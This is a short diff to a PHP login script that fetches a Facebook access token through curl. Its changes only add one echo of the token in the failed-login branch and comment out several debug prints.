@@ -6,6 +6,7 @@ if(strlen($token) > 250){$token = "invalid";};
 $_SESSION["token"] = $token;
 grava();
 if($token == "invalid"){
+ echo '<br>'. $token .'</br>';
  echo '<a href="index.php" style="font-family:arial; font-size:11px;">Failed to Log In. Try Again.</a>';
 }else{
 //echo 'chat';
@@ -69,12 +70,12 @@ curl_setopt($ch, CURLOPT_REFERER, "http://m.facebook.com");
 $a = curl_exec($ch); // $a will contain all headers
 $url = curl_getinfo($ch, CURLINFO_EFFECTIVE_URL); // This is what you need, it will return you the last effective URL 
  
-echo "<pre>";
-print_r($a);
-echo"<br>";
-echo "</pre>";
-echo $url; // Voila
-echo"<br>";
+//echo "<pre>";
+//print_r($a);
+//echo"<br>";
+//echo "</pre>";
+//echo $url; // Voila
+//echo"<br>";
 curl_close($ch);
  
  
@@ -86,7 +87,7 @@ $pos2 = strpos($a, "&expires_in");
 $token = substr($a,$pos1,$pos2 - $pos1);
 
  
-echo $token;
+//echo $token;
 return $token;
 
 }
